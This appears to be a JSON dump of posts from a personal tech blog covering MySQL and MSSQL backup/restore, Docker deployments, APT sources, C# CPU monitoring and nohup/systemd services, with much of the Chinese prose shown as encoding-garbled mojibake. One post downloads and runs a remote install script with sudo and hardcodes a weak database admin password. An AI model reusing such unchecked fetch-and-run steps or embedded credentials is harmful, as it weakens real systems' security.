å‘½ä»¤å¤‡ä»½æ•°æ®åº“ä¸­çš„ç‰¹å®šè¡¨åï¼Œå¯ä»¥é€šè¿‡ mysql å‘½ä»¤æ¥æ¢å¤è¿™äº›è¡¨çš„æ•°æ®ã€‚ä»¥ä¸‹æ˜¯è¿˜åŸå‘½ä»¤çš„åŸºæœ¬æ ¼å¼ï¼š 1mysql -u root -p mydatabase &lt; backup.sql åœ¨è¿™ä¸ªå‘½ä»¤ä¸­ï¼š -u root æŒ‡å®šMySQLçš„ç”¨æˆ·åä¸ºrootã€‚-p è¡¨ç¤ºæ¥ä¸‹æ¥ä¼šæç¤ºè¾“å…¥è¯¥ç”¨æˆ·çš„å¯†ç ã€‚mydatabase æ˜¯è¦è¿˜åŸæ•°æ®çš„ç›®æ ‡æ•°æ®åº“åã€‚&lt; backup.sql è¡¨ç¤ºå°†å¤‡ä»½æ–‡ä»¶ backup.sql ä¸­çš„å†…å®¹å¯¼å…¥åˆ°æŒ‡å®šçš„æ•°æ®åº“ä¸­ã€‚ åœ¨æ‰§è¡Œä¸Šè¿°å‘½ä»¤å‰ï¼Œè¯·ç¡®ä¿ï¼š ç›®æ ‡æ•°æ®åº“ mydatabase å·²ç»å­˜åœ¨ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œéœ€è¦å…ˆåˆ›å»ºå®ƒï¼š 1CREATE DATABASE mydatabase; æœ‰è¶³å¤Ÿçš„æƒé™å»æ“ä½œè¿™ä¸ªæ•°æ®åº“ã€‚å¦‚æœä¸ç¡®å®šæ˜¯å¦æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå¯ä»¥è”ç³»æ•°æ®åº“ç®¡ç†å‘˜æˆ–è€…ä½¿ç”¨å…·æœ‰è¶³å¤Ÿæƒé™çš„è´¦æˆ·ã€‚å¤‡ä»½æ–‡ä»¶ backup.sql çš„è·¯å¾„æ˜¯æ­£ç¡®çš„ï¼Œå¹¶ä¸”æ–‡ä»¶æ˜¯å¯è®¿é—®çš„ã€‚ å¦å¤–ï¼Œå¦‚æœåœ¨æ¢å¤è¿‡ç¨‹ä¸­é‡åˆ°é”™è¯¯ï¼Œä¾‹å¦‚å› ä¸ºè¡¨å·²ç»å­˜åœ¨è€Œæ— æ³•å¯¼å…¥æ•°æ®ï¼Œå¯ä»¥é€‰æ‹©å…ˆåˆ é™¤è¿™äº›è¡¨å†è¿›è¡Œæ¢å¤ï¼Œæˆ–è€…åœ¨å¯¼å…¥ä¹‹å‰ä¿®æ”¹SQLæ–‡ä»¶ï¼Œä»¥é¿å…è¿™äº›å†²çªã€‚å¦‚æœå¸Œæœ›è¦†ç›–å·²å­˜åœ¨çš„è¡¨ï¼Œå¯ä»¥åœ¨å¯¼å…¥å‰åˆ é™¤å®ƒä»¬ï¼Œæˆ–è€…ä½¿ç”¨ â€“force å‚æ•°æ¥å¿½ç•¥é”™è¯¯ï¼š 1mysql -u root -p --force mydatabase &lt; backup.sql è¯·æ³¨æ„ï¼Œä½¿ç”¨ â€“force å‚æ•°å¯èƒ½ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±æˆ–æŸåï¼Œå› æ­¤è¯·è°¨æ…ä½¿ç”¨ã€‚åœ¨è¿›è¡Œä»»ä½•æ•°æ®æ“ä½œä¹‹å‰ï¼Œå»ºè®®å†æ¬¡ç¡®è®¤å¤‡ä»½æ–‡ä»¶çš„æ­£ç¡®æ€§å’Œå®Œæ•´æ€§ã€‚ ä¿®æ”¹MySQLç«¯å£çš„æ­¥éª¤ï¼šåœæ­¢MySQLæœåŠ¡ï¼šé¦–å…ˆï¼Œéœ€è¦åœæ­¢MySQLæœåŠ¡ä»¥ç¡®ä¿åœ¨ä¿®æ”¹é…ç½®æ–‡ä»¶æ—¶ä¸ä¼šæœ‰å†²çªã€‚ 1sudo systemctl stop mysql å¤‡ä»½é…ç½®æ–‡ä»¶ï¼šåœ¨ä¿®æ”¹é…ç½®æ–‡ä»¶ä¹‹å‰ï¼Œå»ºè®®å¤‡ä»½åŸå§‹çš„é…ç½®æ–‡ä»¶ã€‚ 1sudo cp /etc/mysql/my.cnf /etc/mysql/my.cnf.bak ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼šä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€MySQLçš„ä¸»é…ç½®æ–‡ä»¶my.cnfã€‚è¿™ä¸ªæ–‡ä»¶é€šå¸¸ä½äº&#x2F;etc&#x2F;mysql&#x2F;ç›®å½•ä¸‹ã€‚ 1sudo nano /etc/mysql/my.cnf æˆ–è€…ä½¿ç”¨å…¶ä»–å–œæ¬¢çš„ç¼–è¾‘å™¨ã€‚ ä¿®æ”¹ç«¯å£ï¼šåœ¨my.cnfæ–‡ä»¶ä¸­æ‰¾åˆ°[mysqld]éƒ¨åˆ†ï¼Œå¹¶æ·»åŠ æˆ–ä¿®æ”¹portæŒ‡ä»¤ï¼Œå°†å…¶è®¾ç½®ä¸ºæƒ³è¦ä½¿ç”¨çš„ç«¯å£å·ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæƒ³å°†ç«¯å£ä¿®æ”¹ä¸º3307ï¼Œå¯ä»¥è¿™æ ·è®¾ç½®ï¼š 12[mysqld]port = 3307 ç¡®ä¿è¿™ä¸ªç«¯å£å·æ²¡æœ‰è¢«å…¶ä»–æœåŠ¡å ç”¨ã€‚ ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘å™¨ï¼šå¦‚æœä½¿ç”¨çš„æ˜¯nanoï¼Œå¯ä»¥æŒ‰Ctrl + Xï¼Œç„¶åæŒ‰Yä¿å­˜æ›´æ”¹ï¼Œæœ€åæŒ‰Enteré€€å‡ºã€‚ é‡å¯MySQLæœåŠ¡ï¼šä¿®æ”¹é…ç½®æ–‡ä»¶åï¼Œéœ€è¦é‡å¯MySQLæœåŠ¡ä»¥ä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚ 1sudo systemctl start mysql æ£€æŸ¥ç«¯å£ï¼šä½¿ç”¨netstatå‘½ä»¤æ£€æŸ¥MySQLæœåŠ¡æ˜¯å¦æ­£åœ¨ç›‘å¬æ–°çš„ç«¯å£ã€‚ 1sudo netstat -tulnp | grep mysql åº”è¯¥èƒ½çœ‹åˆ°MySQLæ­£åœ¨ç›‘å¬æŒ‡å®šçš„æ–°ç«¯å£ã€‚ æ›´æ–°é˜²ç«å¢™è§„åˆ™ ufw ï¼šå¦‚æœçš„Debianç³»ç»Ÿä½¿ç”¨äº†é˜²ç«å¢™ï¼Œç¡®ä¿æ›´æ–°é˜²ç«å¢™è§„åˆ™ä»¥å…è®¸æµé‡é€šè¿‡æ–°çš„MySQLç«¯å£ã€‚ 1sudo ufw allow 3307/tcp","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"}],"author":"mu"},{"title":"debian apt update","slug":"debian-apt-update","date":"2024-08-12T13:41:40.000Z","updated":"2024-08-12T13:46:54.000Z","comments":true,"path":"2024/08/12/debian-apt-update/","permalink":"https://banjinmei.github.io/2024/08/12/debian-apt-update/","excerpt":"","text":"debianæ›´æ¢aptæºåœ¨Debianç³»ç»Ÿä¸­æ›´æ¢APTæºï¼Œä½ éœ€è¦ç¼–è¾‘&#x2F;etc&#x2F;apt&#x2F;sources.listæ–‡ä»¶ï¼Œå°†å…¶ä¸­çš„ç°æœ‰æºåœ°å€æ›¿æ¢ä¸ºæ–°çš„æºåœ°å€ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºæœ¬çš„æ­¥éª¤å’Œç¤ºä¾‹ï¼š æ‰“å¼€ç»ˆç«¯ã€‚ ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ç¼–è¾‘sources.listæ–‡ä»¶ï¼Œä¾‹å¦‚ä½¿ç”¨nanoæˆ–vimï¼š 1sudo nano /etc/apt/sources.list æˆ–è€… 1sudo vim /etc/apt/sources.list æ³¨é‡Šæ‰æˆ–åˆ é™¤æ—§çš„æºåœ°å€è¡Œï¼ˆåœ¨è¡Œé¦–åŠ #å¯ä»¥å°†å…¶æ³¨é‡Šæ‰ï¼‰ã€‚ æ·»åŠ æ–°çš„æºåœ°å€ã€‚ä¾‹å¦‚ï¼ŒDebianå®˜æ–¹çš„éUSæºï¼Œå¯ä»¥æ·»åŠ ä»¥ä¸‹è¡Œï¼š 12deb http://deb.debian.org/debian bullseye main contrib non-freedeb-src http://deb.debian.org/debian bullseye main contrib non-free è¿™é‡Œçš„bullseyeæ˜¯Debiançš„ä»£å·ï¼Œä¾‹å¦‚bookwormã€busterç­‰ã€‚ 1deb http://mirrors.aliyun.com/debian/ stable main contrib non-free ä¿å­˜æ–‡ä»¶å¹¶é€€å‡ºç¼–è¾‘å™¨ã€‚ æ›´æ–°APTæºï¼š 1sudo apt update å‡çº§å·²å®‰è£…çš„åŒ…ï¼š 1sudo apt upgrade è¯·ç¡®ä¿ä½ ä½¿ç”¨çš„æºä¸ä½ çš„Debianç‰ˆæœ¬å…¼å®¹ã€‚å¯ä¿¡çš„æºå¯ä»¥ä¿è¯è½¯ä»¶åŒ…çš„å®‰å…¨å’Œå¯é æ€§ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"}],"author":"mu"},{"title":"docker ittools","slug":"docker-ittools","date":"2024-08-07T14:24:52.000Z","updated":"2024-08-12T13:41:26.000Z","comments":true,"path":"2024/08/07/docker-ittools/","permalink":"https://banjinmei.github.io/2024/08/07/docker-ittools/","excerpt":"","text":"ittoolshttps://github.com/CorentinTh/it-tools/tree/main pnpmhttps://www.pnpm.cn/installation#%E4%BD%BF%E7%94%A8-npm-%E5%AE%89%E8%A3%85 Project Setup1pnpm install Compile and Hot-Reload for Development1pnpm dev Type-Check, Compile and Minify for Production1pnpm build Run Unit Tests with Vitest1pnpm test Lint with ESLint1pnpm lint Create a new toolTo create a new tool, there is a script that generate the boilerplate of the new tool, simply run: 1pnpm run script:create:tool my-tool-name docker run1docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"it","slug":"it","permalink":"https://banjinmei.github.io/tags/it/"}],"author":"mu"},{"title":"Email Server","slug":"Email-Server","date":"2024-08-06T11:33:24.000Z","updated":"2024-08-07T14:23:06.000Z","comments":true,"path":"2024/08/06/Email-Server/","permalink":"https://banjinmei.github.io/2024/08/06/Email-Server/","excerpt":"","text":"docker1docker run -d -p 25:25 -p 80:80 -p 110:110 -p 143:143 -p 443:443 -p 587:587 -p 993:993 -p 995:995 -v /etc/localtime:/etc/localtime:ro -v /data/poste/data:/data --name &quot;PosteServ&quot; -h &quot;mx.xxxxxx.com&quot; -t analogic/poste.io è§£æ mx Aè®°å½•å¼€æ”¾25 80 110 143 443 587 993 995ç«¯å£ #&#x2F;srv&#x2F;poste&#x2F;dataä¸ºPosteæ•°æ®å­˜æ”¾æ–‡ä»¶å¤¹ï¼Œå¦‚ç”¨æˆ·æ•°æ®åº“ã€ç”µå­é‚®ä»¶ã€æ—¥å¿—ï¼Œæ–¹ä¾¿å¤‡ä»½ã€‚ 443ä¸ºwebæ§åˆ¶å°ç«¯å£ipç«¯å£è®¿é—®https://ip è®¿é—®æ·»åŠ ç®¡ç†é‚®ç®±First poste.io configuration There is no â€œserver.iniâ€ in your data folder, we will try create one. You can update it later in your data folder. åˆ›å»ºé‚®ç®±adm https://ip/webmailç™»å½•é‚®ç®± API&#x2F;admin&#x2F;api&#x2F;doc api","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"email","slug":"email","permalink":"https://banjinmei.github.io/tags/email/"}],"author":"mu"},{"title":"Debian docker mssql","slug":"Debian-docker-mssql","date":"2024-08-06T11:30:54.000Z","updated":"2025-03-16T17:29:25.395Z","comments":true,"path":"2024/08/06/Debian-docker-mssql/","permalink":"https://banjinmei.github.io/2024/08/06/Debian-docker-mssql/","excerpt":"","text":"docker12curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.sh æŸ¥çœ‹æ¶æ„ 12uname -m å®‰è£…1docker run -e &quot;ACCEPT_EULA=Y&quot; -e &quot;SA_PASSWORD=Qq123123.&quot; -e &quot;TZ=Asia/Shanghai&quot; -p 1433:1433 --name sqlserver2022 -d mcr.microsoft.com/mssql/server:2022-latest å¼€æ”¾ç«¯å£ 1433 è¿›å…¥å®¹å™¨ 1docker exec -it sqlserver2022 /bin/bash ä½¿ç”¨navicat testsa Qq123123. æµ‹è¯•è¿æ¥ SQLæµ‹è¯• 1234567891011121314151617CREATE DATABASE mydb;GOUSE mydb;GOCREATE TABLE Users ( UserId INT PRIMARY KEY IDENTITY(1,1), UserName NVARCHAR(50) NOT NULL);GOINSERT INTO Users (UserName) VALUES (&#x27;zs&#x27;);INSERT INTO Users (UserName) VALUES (&#x27;ls&#x27;);INSERT INTO Users (UserName) VALUES (&#x27;w5&#x27;);GOSELECT * FROM Users;GO BACKUP12345USE master;GOBACKUP DATABASE mydb TO DISK = &#x27;mydblog.bak&#x27; WITH COMPRESSION, INIT, STATS=5;GO RESTORE12345678910111213141516171819202122update users set username = &#x27;zsss1&#x27; where userid= 1;goselect * from users;goUSE master;GO -- æ£€æŸ¥æ•°æ®åº“æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™åˆ é™¤IF EXISTS (SELECT name FROM sys.databases WHERE name = &#x27;mydb&#x27;)BEGIN DROP DATABASE mydb;ENDGO -- è¿˜åŸæ•°æ®åº“RESTORE DATABASE mydbFROM DISK = &#x27;mydblog.bak&#x27; GO if restore err SET RECOVERY SIMPL 12345678910111213141516171819USE[master] GO ALTER DATABASE mydb SET RECOVERY SIMPLE WITH NO_WAIT GO ALTER DATABASE mydb SET RECOVERY SIMPLE --ç®€å•æ¨¡å¼ GO RESTORE DATABASE mydb FROM DISK = &#x27;mydblog.bak&#x27; GOALTER DATABASE mydb SET RECOVERY FULL WITH NO_WAIT GO ALTER DATABASE mydb SET RECOVERY FULL --è¿˜åŸä¸ºå®Œå…¨æ¨¡å¼ GOuse mydb go select * from users;go bak file12345var lib docker/var/lib/docker/overlay2/c3753774b8f233196f80cb43e0b38ff0e1d2600e6d6f48e10e9c472ff90b4d81/merged/var/opt/mssql/data/mydblog.bak/var/lib/docker/overlay2/c3753774b8f233196f80cb43e0b38ff0e1d2600e6d6f48e10e9c472ff90b4d81/diff/var/opt/mssql/data/mydblog.bak","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"}],"author":"mu"},{"title":"Linux CPU now","slug":"Linux-CPU-now","date":"2024-08-04T17:51:08.000Z","updated":"2024-11-13T16:54:31.946Z","comments":true,"path":"2024/08/05/Linux-CPU-now/","permalink":"https://banjinmei.github.io/2024/08/05/Linux-CPU-now/","excerpt":"","text":"linux æŸ¥çœ‹æ­£åœ¨ cpuå ç”¨åœ¨Linuxä¸­ï¼Œå¯ä»¥ä½¿ç”¨å¤šç§å‘½ä»¤æ¥æŸ¥çœ‹å“ªä¸ªè¿›ç¨‹æ­£åœ¨ä½¿ç”¨CPUèµ„æºã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸ç”¨çš„å‘½ä»¤ï¼š top - å®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸­å„ä¸ªè¿›ç¨‹çš„èµ„æºå ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬CPUä½¿ç”¨ç‡ã€‚ tophtop - topçš„å¢å¼ºç‰ˆï¼Œæä¾›æ›´ç›´è§‚çš„ç•Œé¢ï¼Œéœ€è¦å•ç‹¬å®‰è£…ã€‚ htopps - æ˜¾ç¤ºå½“å‰è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ï¼Œç»“åˆauxé€‰é¡¹å¯ä»¥æŸ¥çœ‹CPUå ç”¨ç‡ã€‚ 1ps aux --sort=-%cpu | head pidstat - ç”¨äºç›‘è§†ä¸ªåˆ«ä»»åŠ¡çš„CPUå’Œå†…å­˜ä½¿ç”¨æƒ…å†µï¼Œé€šå¸¸ä¸æ—¶é—´ç»“åˆä½¿ç”¨ã€‚ 1pidstat 1 è¿™äº›å‘½ä»¤ä¼šä»¥å®æ—¶æˆ–è€…å®šæ—¶çš„æ–¹å¼è¾“å‡ºCPUå ç”¨å‰å‡ çš„è¿›ç¨‹ï¼Œå¸®åŠ©è¯†åˆ«å’Œè§£å†³CPUå ç”¨é«˜çš„é—®é¢˜ã€‚ æŸ¥çœ‹docker12345docker ps docker ps -adocker start cont C# è·å–CpuwinPerformanceCounter å®ä¾‹ï¼Œç”¨äºç›‘æ§æ€» CPU ä½¿ç”¨ç‡ï¼ˆâ€_Totalâ€ è¡¨ç¤ºç›‘æ§æ‰€æœ‰ CPU æ ¸å¿ƒçš„æ€»ä½“ä½¿ç”¨æƒ…å†µï¼‰ã€‚ 1dotnet add package System.Diagnostics.PerformanceCounter 12345678910111213141516// åˆ›å»ºä¸€ä¸ªç”¨äºè·å– CPU å ç”¨ç‡çš„ PerformanceCounter å¯¹è±¡ PerformanceCounter cpuCounter = new PerformanceCounter(&quot;Processor&quot;, &quot;% Processor Time&quot;, &quot;_Total&quot;); // å…ˆæ‰§è¡Œä¸€æ¬¡ NextValue()ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨é€šå¸¸ä¼šè¿”å› 0 cpuCounter.NextValue(); Thread.Sleep(1000); // ç­‰å¾… 1 ç§’ä»¥ä¾¿è·å–å‡†ç¡®å€¼ while (true) &#123; // è·å–å½“å‰çš„ CPU ä½¿ç”¨ç‡ float cpuUsage = cpuCounter.NextValue(); Console.WriteLine($&quot;å½“å‰ CPU å ç”¨ç‡: &#123;cpuUsage&#125;%&quot;); // æ¯éš” 1 ç§’è·å–ä¸€æ¬¡æ•°æ® Thread.Sleep(1000); &#125; Linux ç¯å¢ƒä¸­ï¼ŒSystem.Diagnostics.PerformanceCounter ä¸å¯ç”¨ï¼Œå› æ­¤éœ€è¦é‡‡ç”¨å…¶ä»–æ–¹æ³•æ¥è·å– CPU å ç”¨ç‡ã€‚ä¸€ä¸ªå¸¸è§çš„æ–¹æ³•æ˜¯è¯»å– &#x2F;proc&#x2F;stat æ–‡ä»¶å¹¶è§£æå†…å®¹ï¼Œæˆ–è€…é€šè¿‡è°ƒç”¨ Linux çš„ top æˆ– vmstat å‘½ä»¤æ¥è·å– CPU ä½¿ç”¨ç‡ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªé€šè¿‡è¯»å– &#x2F;proc&#x2F;stat æ–‡ä»¶æ¥è®¡ç®— CPU å ç”¨ç‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051using System;using System.IO;using System.Threading;class Program&#123; static void Main() &#123; // åˆå§‹çš„ CPU æ—¶é—´ä¿¡æ¯ var initialCpuTimes = GetCpuTimes(); Thread.Sleep(1000); // ç­‰å¾… 1 ç§’ while (true) &#123; // è·å–å½“å‰çš„ CPU æ—¶é—´ä¿¡æ¯ var currentCpuTimes = GetCpuTimes(); // è®¡ç®— CPU ä½¿ç”¨ç‡ var totalDiff = (currentCpuTimes.total - initialCpuTimes.total); var idleDiff = (currentCpuTimes.idle - initialCpuTimes.idle); var cpuUsage = 100.0 * (1.0 - (double)idleDiff / totalDiff); Console.WriteLine($&quot;å½“å‰ CPU å ç”¨ç‡: &#123;cpuUsage:F2&#125;%&quot;); // æ›´æ–°åˆå§‹æ—¶é—´ initialCpuTimes = currentCpuTimes; Thread.Sleep(1000); // æ¯ç§’æ›´æ–°ä¸€æ¬¡ &#125; &#125; // è§£æ /proc/stat æ–‡ä»¶å¹¶è®¡ç®— CPU æ—¶é—´ private static (long total, long idle) GetCpuTimes() &#123; var cpuLine = File.ReadAllText(&quot;/proc/stat&quot;).Split(&#x27;\\n&#x27;)[0]; var cpuValues = cpuLine.Split(new[] &#123; &#x27; &#x27; &#125;, StringSplitOptions.RemoveEmptyEntries); // è·å–å„ä¸ªæ—¶é—´å€¼ long user = long.Parse(cpuValues[1]); long nice = long.Parse(cpuValues[2]); long system = long.Parse(cpuValues[3]); long idle = long.Parse(cpuValues[4]); long iowait = long.Parse(cpuValues[5]); long irq = long.Parse(cpuValues[6]); long softirq = long.Parse(cpuValues[7]); // è®¡ç®—æ€»æ—¶é—´å’Œç©ºé—²æ—¶é—´ long total = user + nice + system + idle + iowait + irq + softirq; return (total, idle); &#125;&#125; é€šè¿‡è¯»å– &#x2F;proc&#x2F;stat æ–‡ä»¶ï¼Œæå– CPU çš„å„ä¸ªæ—¶é—´å­—æ®µã€‚GetCpuTimes() æ–¹æ³•è§£æç¬¬ä¸€è¡Œçš„ cpu ç»Ÿè®¡æ•°æ®ï¼Œå…¶ä¸­å„å­—æ®µä»£è¡¨ç”¨æˆ·ã€ç³»ç»Ÿã€ç©ºé—²ã€IOç­‰å¾…ç­‰æ—¶é—´ã€‚è®¡ç®— CPU ä½¿ç”¨ç‡ï¼štotalDiff æ˜¯å‰åä¸¤æ¬¡é‡‡é›†çš„æ€» CPU æ—¶é—´å·®ã€‚idleDiff æ˜¯å‰åä¸¤æ¬¡é‡‡é›†çš„ç©ºé—²æ—¶é—´å·®ã€‚cpuUsage ä½¿ç”¨å…¬å¼ 1.0 - (idleDiff &#x2F; totalDiff) è®¡ç®— CPU å ç”¨ç‡ã€‚æ³¨æ„äº‹é¡¹è¯¥ä»£ç é€šè¿‡æ¯éš” 1 ç§’é‡‡é›†ä¸€æ¬¡æ•°æ®æ¥è®¡ç®— CPU ä½¿ç”¨ç‡ï¼Œå› æ­¤å¯ä»¥å®æ—¶æ˜¾ç¤º CPU å ç”¨ç‡ã€‚GetCpuTimes() æ–¹æ³•ä¸­è¯»å– &#x2F;proc&#x2F;stat æ–‡ä»¶çš„å†…å®¹ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ Linux ç³»ç»Ÿä¸­è·å– CPU æ—¶é—´çš„æ ‡å‡†æ–¹æ³•ã€‚ä»£ç é€‚ç”¨äºæ”¯æŒ &#x2F;proc&#x2F;stat æ–‡ä»¶çš„ Linux ç³»ç»Ÿã€‚ ç¨‹åºæ•è· top å‘½ä»¤çš„è¾“å‡º 123456789101112131415161718192021222324252627282930313233343536373839404142434445using System;using System.Diagnostics;using System.Text.RegularExpressions;class Program&#123; static void Main() &#123; // æ‰§è¡Œ `top` å‘½ä»¤ ProcessStartInfo psi = new ProcessStartInfo &#123; FileName = &quot;top&quot;, Arguments = &quot;-bn1&quot;, // ä¸€æ¬¡æ€§æ‰“å°è¾“å‡º RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true &#125;; using (Process process = Process.Start(psi)) &#123; using (var reader = process.StandardOutput) &#123; string output = reader.ReadToEnd(); ParseCpuUsage(output); &#125; &#125; &#125; private static void ParseCpuUsage(string topOutput) &#123; // åŒ¹é… top å‘½ä»¤ä¸­çš„ &quot;Cpu(s): xx.x% us&quot; å­—æ®µ Regex regex = new Regex(@&quot;Cpu\\(s\\):\\s+(\\d+\\.\\d+)%\\s+us&quot;, RegexOptions.Compiled); var match = regex.Match(topOutput); if (match.Success) &#123; string cpuUsage = match.Groups[1].Value; Console.WriteLine($&quot;å½“å‰ç³»ç»Ÿ CPU ä½¿ç”¨ç‡: &#123;cpuUsage&#125;%&quot;); &#125; else &#123; Console.WriteLine(&quot;æ— æ³•è§£æ CPU ä½¿ç”¨ç‡ã€‚&quot;); &#125; &#125;&#125; åˆ¤æ–­OSç³»ç»Ÿ 123456789101112131415var os = Environment.OSVersion;var isWindows = os.Platform == PlatformID.Win32NT || os.Platform == PlatformID.Win32S || os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.WinCE;if (isWindows)&#123; Console.WriteLine(&quot;å½“å‰æ“ä½œç³»ç»Ÿæ˜¯ Windows.&quot;);&#125;else&#123; // å¯¹äº .NET Framework, æ²¡æœ‰ç›´æ¥çš„æ–¹æ³•æ¥åŒºåˆ† Linux å’Œ macOS // ä½†æ˜¯é€šå¸¸æ¥è¯´ï¼Œå¦‚æœä¸æ˜¯ Windowsï¼Œä¸”åœ¨é Windows å¹³å°ä¸Šè¿è¡Œï¼Œåˆ™å¯ä»¥è®¤ä¸ºæ˜¯ Linux æˆ– macOS Console.WriteLine(&quot;å½“å‰æ“ä½œç³»ç»Ÿå¯èƒ½æ˜¯ Linux æˆ– macOS.&quot;);&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":"Go Background","slug":"Go-Background","date":"2024-08-04T17:44:01.000Z","updated":"2024-08-04T17:52:58.000Z","comments":true,"path":"2024/08/05/Go-Background/","permalink":"https://banjinmei.github.io/2024/08/05/Go-Background/","excerpt":"","text":"debian goç¨‹åº åå°è¿è¡Œè¦åœ¨Debianç³»ç»Ÿä¸Šå°†Goç¨‹åºè®¾ç½®ä¸ºåå°è¿è¡Œï¼Œä½¿ç”¨nohupå‘½ä»¤å’Œ&amp;ç¬¦å·ã€‚ ç¼–è¯‘Goç¨‹åºï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚ 1go build -o myapp main.go ä½¿ç”¨nohupå°†ç¨‹åºæ”¾åˆ°åå°è¿è¡Œï¼Œå¹¶å°†è¾“å‡ºé‡å®šå‘åˆ°nohup.outæ–‡ä»¶ã€‚ 1nohup ./myapp &amp; å¦‚æœæ‚¨æƒ³è¦ç¨‹åºåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªsystemdæœåŠ¡æ–‡ä»¶ã€‚ åˆ›å»ºä¸€ä¸ªåä¸ºmyapp.serviceçš„æ–‡ä»¶ï¼š 1sudo nano /etc/systemd/system/myapp.service åœ¨ç¼–è¾‘å™¨ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 123456789101112[Unit]Description=My Go ApplicationAfter=network.target [Service]Type=simpleExecStart=/path/to/your/myappRestart=on-failureRestartSec=5 [Install]WantedBy=multi-user.target ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘å™¨ã€‚ å¯ç”¨å¹¶å¯åŠ¨æœåŠ¡ï¼š 12sudo systemctl enable myapp.servicesudo systemctl start myapp.service Goç¨‹åºå°±ä¼šåœ¨Debianç³»ç»Ÿä¸Šä½œä¸ºæœåŠ¡åå°è¿è¡Œã€‚ c# run~123456789sudo nohup dotnet run /root/socketa/TcpSk &gt; output20240805.log 2&gt;&amp;1 &amp; sudo nohup dotnet run /root/netser/xx &gt; output1.log 2&gt;&amp;1 &amp;ps -ef | grep nohup kill","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"},{"name":"nohup","slug":"nohup","permalink":"https://banjinmei.github.io/tags/nohup/"}],"author":"mu"},{"title":"C# keep alive","slug":"C-keep-alive","date":"2024-08-04T16:38:00.000Z","updated":"2024-08-04T17:49:40.000Z","comments":true,"path":"2024/08/05/C-keep-alive/","permalink":"https://banjinmei.github.io/2024/08/05/C-keep-alive/","excerpt":"","text":"åœ¨C#ä¸­ï¼Œæƒ³è®©ä¸€ä¸ªæ§åˆ¶å°åº”ç”¨ç¨‹åºä¿æŒè¿è¡Œè€Œä¸ä¾èµ– Cnsole.ReadKey()ï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å®ç°ã€‚ 1. ä½¿ç”¨äº‹ä»¶å¾ªç¯å¯ä»¥ä½¿ç”¨ EventWaitHandle æˆ–è€…å…¶ä»–ç±»ä¼¼çš„åŒæ­¥åŸè¯­æ¥åˆ›å»ºä¸€ä¸ªäº‹ä»¶å¾ªç¯ï¼Œè®©ç¨‹åºä¿æŒåœ¨ç­‰å¾…çŠ¶æ€ã€‚ 12345678910111213141516171819using System;using System.Threading;class Program&#123; static void Main() &#123; // åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨é‡ç½®çš„äº‹ä»¶å¯¹è±¡ EventWaitHandle waitHandle = new EventWaitHandle(false, EventResetMode.AutoReset); Console.WriteLine(&quot;Press any key to exit...&quot;); // ç­‰å¾…äº‹ä»¶è¢«è®¾ç½®ï¼Œå¦‚æœæ²¡æœ‰æ¥æ”¶åˆ°ä¿¡å·ï¼Œåˆ™ä¿æŒç­‰å¾…çŠ¶æ€ waitHandle.WaitOne(); Console.Clear(); &#125;&#125; 